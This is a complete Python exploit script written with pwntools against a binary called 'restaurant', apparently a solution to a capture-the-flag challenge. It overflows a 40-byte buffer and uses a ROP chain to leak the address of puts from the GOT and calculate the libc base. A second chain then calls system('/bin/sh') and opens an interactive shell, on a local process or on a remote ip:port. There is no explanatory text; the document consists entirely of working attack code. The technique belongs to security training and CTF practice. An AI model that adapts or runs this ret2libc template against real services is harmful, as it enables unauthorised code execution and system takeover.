from pwn import *
import sys

elf = context.binary = ELF('./restaurant')
libc = ELF('./libc.so.6')
rop = ROP(elf)

if len(sys.argv) > 1:
    ip, port = sys.argv[1].split(':')
    p = remote(ip, int(port))
else:
    p = process(elf.path)

payload  = flat(
    b'A'*40,
    rop.find_gadget(['pop rdi','ret'])[0],
    elf.got['puts'],
    elf.sym['puts'],
    elf.sym['main']
)

p.recvuntil(b'> ')
p.sendline(b'1')
p.sendline(payload)

puts_leak = p.recvuntil(b'\x7f')[-6:] + b'\x00\x00'
libc.address = u64(puts_leak) - libc.sym['puts']

payload = flat(
    b'A'*40,
    rop.find_gadget(['ret'])[0],
    rop.find_gadget(['pop rdi','ret'])[0],
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
)

p.sendline(b'1')
p.sendline(payload)
p.interactive()
